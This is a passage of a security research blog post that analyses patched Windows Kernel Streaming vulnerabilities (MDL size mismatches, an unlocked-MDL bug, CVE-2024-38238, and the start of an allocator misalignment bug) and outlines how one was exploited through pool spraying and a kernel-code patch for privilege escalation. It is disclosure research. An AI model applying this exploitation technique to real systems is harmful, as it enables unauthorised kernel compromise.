&lt;p&gt;For the second &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt;, the actual allocated buffer is only &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1000&lt;/code&gt; bytes, but the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FrameExtent&lt;/code&gt; field in the structure indicates a size of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x20000&lt;/code&gt;. As a result, the worker attempts to copy &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x20000&lt;/code&gt; bytes into &lt;strong&gt;a much smaller buffer&lt;/strong&gt;, leading to a buffer overflow.&lt;/p&gt;

&lt;p&gt;In fact, several of the vulnerabilities we discovered stem from this exact issue. As long as an attacker can create a mismatch between a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; and its corresponding MDL, the result is a buffer overflow.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;CVE-2024-38237&lt;/li&gt;
  &lt;li&gt;CVE-2025-21375&lt;/li&gt;
  &lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The second bug class we’re going to discuss is called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;The Forgotten Lock in MDL&lt;/code&gt; —
a vulnerability pattern involving incorrect handling of MDL.&lt;/p&gt;

&lt;p&gt;This bug class is a bit more special&lt;/p&gt;

&lt;h3 id=&quot;the-forgotten-lock&quot;&gt;The Forgotten Lock&lt;/h3&gt;

&lt;p&gt;Actually, it is an &lt;strong&gt;uninitialized issue&lt;/strong&gt; in MDL.&lt;/p&gt;

&lt;p&gt;Before we discuss this issue, let’s first look at some common mistakes developers make when working with MDLs.&lt;/p&gt;

&lt;h4 id=&quot;security-risks-of-mdl&quot;&gt;Security Risks of MDL&lt;/h4&gt;

&lt;p&gt;The first one is a common issued recently — one that I also mentioned in a &lt;a href=&quot;https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1-en/#cve-2023-29360---logical-vulnerability&quot;&gt;previous post&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Incorrect &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;access mode&lt;/code&gt; flag in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmProbeAndLockPages&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When the kernel calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmProbeAndLockPages&lt;/code&gt; to lock a user-supplied memory buffer, it may incorrectly set the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;access mode&lt;/code&gt; flag. This mistake causes the kernel to skip the check that verifies whether the target address belongs to user space. As a result, a user-mode process could supply a kernel-mode address, leading to arbitrary memory writes in kernel space.&lt;/p&gt;

&lt;p&gt;For more details, please refer to &lt;a href=&quot;https://conference.hitb.org/hitbsecconf2023hkt/materials/D2T1%20-%20Windows%20Kernel%20Security%20-%20A%20Deep%20Dive%20into%20Two%20Exploits%20Demonstrated%20at%20Pwn2Own%20-%20Thomas%20Imbert.pdf&quot;&gt;Synacktiv’s presentation at HITB 2023 HKT&lt;/a&gt; and &lt;a href=&quot;https://x.com/Big5_sec&quot;&gt;Nicolas Zilio(@Big5_sec)&lt;/a&gt; ‘s blog &lt;a href=&quot;https://big5-sec.github.io/posts/CVE-2023-29360-analysis/&quot;&gt;post&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Double Free in I/O Complete&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another common issue occurs when a kernel driver frees an MDL without clearing the corresponding MDL pointer in the IRP. Later, when the IRP is completed, the system attempts to free the MDL again, resulting in a double free vulnerability during &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iocompleterequest&quot;&gt;IoCompleteRequest&lt;/a&gt;. This pattern can also be found in Kernel Streaming(&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24046&quot;&gt;CVE-2025-24046&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When frame allocation fails, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; releases the MDLs in the MDL chain, but it does not clear the MDL pointer stored in the IRP. As a result, the MDL is freed again when the IRP completes — leading to a double free.&lt;/p&gt;

&lt;p&gt;These two bug patterns are quite common, there are many more overlooked issues out there.&lt;/p&gt;

&lt;p&gt;Let’s take an example from &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/driversecurity/driver-security-dev-best-practices&quot;&gt;Microsoft driver Security Guidance&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;In this document, Microsoft warns that if developers use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmMapIoSpace&lt;/code&gt; without properly validating the physical address, it could result in arbitrary physical memory being mapped into virtual address space — potentially leading to serious security issues.&lt;/p&gt;

&lt;p&gt;To illustrate safe usage, Microsoft provides the following secure coding example:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Func ConstrainedMap(PHYSICAL_ADDRESS paAddress)
{
    // expected_Address must be constrained to required usage boundary to prevent abuse
    if(paAddress == expected_Address &amp;amp;&amp;amp; qwSize == valid_Size)  //-----[1]
    {
        lpAddress = MmMapIoSpace(paAddress, qwSize, ...);   
        pMdl = IoAllocateMdl( lpAddress, ...); //----------[2]
        MmMapLockedPagesSpecifyCache(pMdl, UserMode, ... ); //-------------[3]
    }
    else
    {
        return error;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;First, the physical address is validated at [1]. Then, at [2], an MDL is allocated to describe the mapped memory region.Finally, [3] calls MmMapLockedPagesSpecifyCache to map the physical memory into a user-space virtual address.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Now… you might notice something strange here.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As we mentioned earlier, in typical usage, after allocating an MDL, you are expected to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmProbeAndLockPages&lt;/code&gt; to lock the underlying physical pages. However, in this case, the code calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmMapLockedPagesSpecifyCache&lt;/code&gt; directly, without locking the pages first. This results in undefined behavior, as the MDL may not correctly describe valid or accessible physical memory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in diagram above, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoAllocateMdl&lt;/code&gt; is used to allocate the MDL structure and initialize some basic metadata. However, if we immediately call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmMapLockedPagesSpecifyCache&lt;/code&gt; without first locking the pages,the function will still attempt to access the PFN array inside the MDL. This can lead to undefined behavior, or worse, controlled memory corruption. In many cases, this leads directly to a BSoD.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, this kind of mistake is widespread throughout Kernel Streaming. In the following section, I will examine CVE-2024-38238, which clearly demonstrates this issue in practice.&lt;/p&gt;

&lt;h4 id=&quot;cve-2024-38238&quot;&gt;CVE-2024-38238&lt;/h4&gt;

&lt;p&gt;We once again construct two &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; structures — and this time, both frames are of the same size. The first frame has the cache flag set, while the second frame does not.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As mentioned earlier, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk.sys&lt;/code&gt; will allocate and lock an MDL only for the frame that does not have the cache flag set. Once that’s done, the IRP is passed down to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; for further processing.&lt;/p&gt;

&lt;p&gt;Now, let’s take a closer look at how &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; handles this frame.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;__int64  CKsMdlcache::MdlCacheHandleThunkBufferIrp(...)
{
  ...
  while(TotalSize &amp;gt;= sizeof(KSSTREAM_HEADER)){ //-------[4]
      ...
      if(OptionsFlag &amp;amp; 0x8000 == 0) //-------[5]
        return KsProbeStreamIrp(irp, a3, 0); //-------[8]
      IoAllocateMdl(header-&amp;gt;Data,header-&amp;gt;FrameExtent,...,Irp); //-------[6]
  }
  ...
  for(i = irp-&amp;gt;MdlAddress;i;i = i-&amp;gt;Next){
      MmProbeAndLockPages(i, irp-&amp;gt;RequestorMode, IoWriteAccess); //-------[7]
  }
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looking at the while loop in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!CKsMdlcache::MdlCacheHandleThunkBufferIrp&lt;/code&gt; at [4], we can see that it iterates through each &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSSTREAM_HEADER&lt;/code&gt; and checks the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OptionsFlag&lt;/code&gt;s at [5] to determine whether an MDL should be allocated.&lt;/p&gt;

&lt;p&gt;If the cache flag is set, it proceeds to allocate a new MDL at [6]. Under WOW64, if the MDL was already allocated (e.g., by ksthunk), KS will then call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmProbeAndLockPages&lt;/code&gt; at [7] to lock the memory pages.&lt;/p&gt;

&lt;p&gt;However, in our specific case:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The first frame has the cache flag set.&lt;/li&gt;
  &lt;li&gt;The second frame does not.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So, when KS begins processing the second frame, it takes the path to KsProbeStreamIrp at [8]. At this point, the MDL chain inside the IRP looks like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first MDL has already been properly locked, but the second one is not locked at all.&lt;/p&gt;

&lt;p&gt;After that, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!KsProbeStreamIrp&lt;/code&gt; handles the mapping of the frame buffers:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;
NTSTATUS KsProbeStreamIrp(PIRP Irp, ULONG ProbeFlags, ULONG HeaderSize){
 ...
 MDL = Irp-&amp;gt;MdlAddress;
 if ( (MDL-&amp;gt;MdlFlags &amp;amp; is_locked_and_nonpaged) != 0 ) { //----[9]
    while ( MDL ) 
    {
        if ( (MdlFlags &amp;amp; 5) != 0 )
        MappedSystemVa = MDL-&amp;gt;MappedSystemVa;
        else
        MappedSystemVa = MmMapLockedPagesSpecifyCache(MDL, 0, MmCached, 0LL, 0, 0x40000010u); 
        
        MDL = MDL-&amp;gt;Next;
    }
 }
}


&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As shown above, the function uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmMapLockedPagesSpecifyCache&lt;/code&gt; to map the frame buffer by each MDL. If the MDL is marked as locked, the function maps it directly. However, there’s a critical flaw: It &lt;strong&gt;only checks the first MDL&lt;/strong&gt; in the MDL chain at [9],and assumes that the entire chain has already been locked.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmMapLockedPagesSpecifyCache&lt;/code&gt; is called on the second MDL, it attempts to map memory based on an uninitialized PFN list.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Unexploitatble ?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The good news is that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoAllocateMdl&lt;/code&gt; allocates memory &lt;strong&gt;from NonPagedPoolNx&lt;/strong&gt; &lt;strong&gt;without zero-initializing it&lt;/strong&gt;. This means the PFN array located at the end of the MDL structure will contain leftover memory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown above, when IoAllocateMdl allocates memory, it uses the &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/pool_flags&quot;&gt;POOL_FLAG_UNINITIALIZED&lt;/a&gt; flag, and does not initialize the PFN array in the MDL. This behavior allows us to apply pool spraying techniques to gain partial or full control over the PFN values inside the MDL.&lt;/p&gt;

&lt;p&gt;By calculating the exact size of the MDL structure — including the number of PFNs based on the frame size — we can perform a &lt;a href=&quot;https://www.alex-ionescu.com/?p=231&quot;&gt;pool spray using Named Pipes&lt;/a&gt; to populate &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NonPagedPoolNx&lt;/code&gt; memory with carefully crafted data.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoAllocateMdl&lt;/code&gt; reuses this memory without zero-initialization, the leftover values will be interpreted as valid PFNs, giving the attacker control over physical-to-virtual mappings.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown above, when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MmMapLockedPagesSpecifyCache&lt;/code&gt; is called afterward, it treats the attacker-controlled PFNs as valid physical page mappings and uses them to map the frame buffer.&lt;/p&gt;

&lt;p&gt;Finally, when the worker thread copies image data from the device, it writes directly to the physical addresses specified by the attacker, resulting in a powerful arbitrary physical memory write primitive.&lt;/p&gt;

&lt;p&gt;Actually, not all PFNs can be mapped — they must be valid, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ResidentPage&lt;/code&gt;. But for our purposes, that’s more than enough.&lt;/p&gt;

&lt;p&gt;The next step is to achieve elevation of privilege (EoP) using the arbitrary physical memory write primitive. But that raises the question:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Where should we write?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;During testing on several Windows 24H2, we observed a consistent behavior:
the physical base address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntoskrnl.exe&lt;/code&gt; was typically fixed at 0x100400000.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We tested it on Hyper-V and VMware. The value might have changed in newer builds, but it’s still likely to remain fixed in many cases. This behavior may also depend on the device or hardware configuration.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;So … does that mean we can just write directly to nt and take over the kernel?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;There is a problem ……&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We cannot control the data being written, because it comes directly from the webcam device.&lt;/p&gt;

&lt;p&gt;Initially, it seemed like we were stuck. But with a primitive this powerful — stable and repeatable arbitrary physical memory writes — we knew there had to be a way forward.&lt;/p&gt;

&lt;p&gt;So we went back, carefully reviewed the entire Kernel Streaming workflow, and eventually discovered a new angle of attack.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Buffered&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Kernel Streaming offers a feature called buffered mode. When a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt; is created with the &lt;strong&gt;buffered flag(KSSTREAM_HEADER_OPTIONSF_BUFFEREDTRANSFER)&lt;/strong&gt; set, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; allocates an additional intermediate buffer in kernel space.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/45.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20250517/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;During the streaming process, the contents from the original image buffer are first copied into this intermediate buffer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/47.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20250517/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in diagram above, after the device finishes writing data — or if an error occurs during the transfer — &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; will copy the contents of the buffered memory into the frame buffer. However, in our case, this frame buffer has already been mapped to the physical address of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntoskrnl.exe&lt;/code&gt; image. In other words, we now have an &lt;strong&gt;arbitrary physical memory write primitive&lt;/strong&gt; with fully controlled data. This opens the door to directly modifying kernel code.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In our exploit, we chose to overwrite a security check inside PsOpenProcess. Specifically, we replaced the check for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeDebugPrivilege&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeChangeNotifyPrivilege&lt;/code&gt;. As a result, any normal user can open a high-privilege process except PPL. For more details on the technique of replacing the check with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeChangeNotifyPrivilege&lt;/code&gt;, you can refer to &lt;a href=&quot;https://devco.re/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2-en/#make-abusing-token-privilege-great-again-&quot;&gt;my previous post&lt;/a&gt;.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/OBY6kJ2sxME?si=oJA1FKRKcMbj6G1_&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;There are multiple ways to cause this issue in Kernel Streaming&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;CVE-2024-38238&lt;/li&gt;
  &lt;li&gt;CVE-2024-38241&lt;/li&gt;
  &lt;li&gt;CVE-2025-24066&lt;/li&gt;
  &lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As long as you find a way to make it forget lock, it can result in an arbitrary physical memory writing.&lt;/p&gt;

&lt;p&gt;The last issue we would like to share is &lt;strong&gt;Frame Buffer Misalignment&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;frame-buffer-misalignment-cve-2024-38245&quot;&gt;Frame Buffer Misalignment (CVE-2024-38245)&lt;/h3&gt;

&lt;p&gt;Before diving into that, we first need to introduce a key object in Kernel Streaming: the &lt;a href=&quot;https://learn.microsoft.com/sr-latn-rs/windows-hardware/drivers/stream/ks-allocators&quot;&gt;KS Allocator&lt;/a&gt;. The KS Allocator is responsible for pre-allocating a set of frame buffers that can be reused during streaming operations. This significantly reduces the overhead of dynamic memory allocation at runtime. Typically, an allocator object is associated with a pin, and third-party drivers can also implement their own custom allocator if needed. Kernel Streaming also provides a default allocator for use when no custom implementation is specified.&lt;/p&gt;

&lt;p&gt;In general, a KS Allocator can be created using the &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/nf-ks-kscreateallocator&quot;&gt;KsCreateAllocator&lt;/a&gt; API, and configured through a structure called &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ns-ks-ksallocator_framing&quot;&gt;KSALLOCATOR_FRAMING&lt;/a&gt;. This structure allows you to specify parameters such as the number of frame buffers, the size of each buffer, and even the alignment requirements for each frame buffer.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;typedef struct {
  union {
    ULONG OptionsFlags;
    ULONG RequirementsFlags;
  };
#if ...
  POOL_TYPE PoolType;
#else
  ULONG     PoolType;
#endif
  ULONG     Frames;
  ULONG     FrameSize;
  union {
    ULONG FileAlignment;
    LONG  FramePitch;
  };
  ULONG     Reserved;
} KSALLOCATOR_FRAMING, *PKSALLOCATOR_FRAMING;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Note :&lt;/strong&gt; To specify the alignment of a frame buffer, you must provide an alignment mask during allocator configuration.&lt;/p&gt;

&lt;p&gt;After creating a KS Allocator, we can attach it to the pin. Before reading data from the pin, we need to set its state to &lt;strong&gt;KSSTATE_RUN&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At that moment, the allocator will pre-allocate the number of frame buffers based on the configuration provided earlier.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From that point on, data is streamed from the device into pre-allocated frame buffers. Corresponding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KS FRAME&lt;/code&gt; structures are also allocated. When we send an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IOCTL_KS_READ_STREAM&lt;/code&gt; to read data, the process begins just as described earlier.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, instead of reading data from the device each time, the worker thread will copy data from the pre-allocated frame buffers managed by the allocator. In the following section, we’ll focus on how the default allocator manages these pre-allocated buffers.&lt;/p&gt;

&lt;p&gt;Let’s take a deeper look at &lt;strong&gt;DefaultAllocator&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;ks!KsCreateDefaultAllocatorEx
&lt;img src=&quot;/assets/img/blog/20250517/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When we call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsCreateAllocator&lt;/code&gt;, Kernel Streaming creates a default allocator and initializes it using the parameters we provide. Internally, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; implements its own custom allocation routine - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DefAllocatorAlloc&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DefAllocaorFree&lt;/code&gt; — and utilizes a &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-lookaside-lists&quot;&gt;LookasideList&lt;/a&gt; to efficiently manage buffer allocations and reuse.&lt;/p&gt;

&lt;p&gt;The allocation function is quite simple :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;char *__fastcall DefAllocatorAlloc(POOL_TYPE PoolType, SIZE_T NumberOfBytes, ULONG Alignment)
{
    ...
    if ( Alignment &amp;gt;= FILE_OCTA_ALIGNMENT )
        FileAlignment = Alignment;
    ...
    buffer = ExAllocatePoolWithTag((PoolType | 0x400), v8, &apos;adSK&apos;);//-----[10]
    if ( buffer )
    {
        padding = (~FileAlignment &amp;amp; (buffer + FileAlignment + 4)) - buffer;
        buffer += padding;
        *(buffer - 1) = padding; //-------[11]
    }

}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It simply calls &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exallocatepoolwithtag&quot;&gt;ExAllocatePoolWithTag&lt;/a&gt; to allocate memory at [10]. If an alignment is specified, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks.sys&lt;/code&gt; records the size of the required padding in front of the frame buffer, as shown at [11].&lt;/p&gt;

&lt;p&gt;In the free routine :&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;void __fastcall DefAllocatorFree(unsigned int *Buffer)
{
  __int64 padding; 
  ...
  if ( (Buffer &amp;amp; 0xFFF) != 0 )
    padding = *(Buffer - 1); //---------------[12]
  else
    padding = 0LL;
  ExFreePoolWithTag(Buffer - padding, 0);
}

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;KS use this padding size to calculate the original pointer returned by &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-exallocatepoolwithtag&quot;&gt;ExAllocatePoolWithTag&lt;/a&gt; at [12].&lt;/p&gt;

&lt;p&gt;As shown in the diagram below, the memory layout of the pool looks like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The purple region represents the padding, while the blue region corresponds to the frame buffer itself. The 4 bytes immediately preceding the frame buffer are used to store the padding size. Under normal case, the alignment mask is expected to be a power-of-two minus one (e.g., 0x3F, 0xFFF, etc.).&lt;/p&gt;

&lt;p&gt;However, here’s the problem:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250517/55.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;KS only checks whether the alignment mask is greater than 0xFFF. If it’s less than 0xFFF, it accepts any value, even if it’s not a valid alignment.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Useless Bug ?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;At first glance, this might seem like a harmless bug — just a minor issue with memory alignment. But what happens when that misaligned buffer meets the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt;?&lt;/p&gt;

&lt;h4 id=&quot;lookasidelist&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-lookaside-lists&quot;&gt;LookasideList&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt; are per-processor caches optimized for fixed-size memory blocks. Instead of using the general pool allocator, they maintain a simple singly linked list for fast allocation and deallocation. &lt;strong&gt;Both allocations and frees always check the list first before using the general pool, and the list operates in LIFO (Last-In, First-Out) order.&lt;/strong&gt; One important constraint is that entries stored in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt; &lt;strong&gt;is expected to be aligned to 0x10 bytes&lt;/strong&gt;. You can refer to &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-slist_entry&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SLIST_ENTRY&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;As you can see in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExAllocateFromNPagedLookasideList&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;PSLIST_ENTRY ExAllocateFromNPagedLookasideList(...){
    ...
    ReturnChunk = ListHead-&amp;gt;FreeChunk &amp;amp; 0xFFFFFFFFFFFFFFF0;
    ListHead-&amp;gt;FreeChunk = ReturnChunk-&amp;gt;Next;
    ListHead-&amp;gt;Depth-- ;
    ...
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The allocation logic aligns the returned chunk address to 0x10 bytes before returning it to the caller.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;PSLIST_ENTRY ExFreeToNPagedLookasideList(...,PSLIST_ENTRY Chunk){
    ...
    NextChunk = ListHead-&amp;gt;FreeChunk &amp;amp; 0xFFFFFFFFFFFFFFF0
    Chunk-&amp;gt;Next = NextChunk;
    ListHead-&amp;gt;FreeChunk = Chunk;
    ListHead-&amp;gt;Depth++;
    ...
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Similarly, when freeing memory back to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LookasideList&lt;/code&gt;, it also aligns the chunk. As shown in this code snippet above, the free routine aligns the first entry in the list&lt;/p&gt;

&lt;blockquote&gt;
